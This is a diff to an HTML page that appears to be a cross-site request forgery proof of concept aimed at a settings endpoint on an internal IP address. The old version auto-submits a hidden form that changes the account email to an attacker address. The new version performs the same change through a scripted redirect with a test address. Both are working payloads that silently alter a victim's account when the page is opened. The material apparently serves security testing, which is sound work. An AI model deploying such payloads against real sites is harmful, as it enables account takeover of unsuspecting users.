@@ -1,16 +1,10 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
   <body>
-    <form
-      action="http://100.101.228.35:6009/settings/email"
-      method="GET"
-      target="_top"
-    >
-      <input type="hidden" name="new" value="attacker@example.com" />
-    </form>
-
     <script>
-      document.forms[0].submit();
+      window.location.replace(
+        "http://100.101.228.35:6009/settings/email?new=csrf-test-2026%40example.com"
+      );
     </script>
   </body>
 </html>
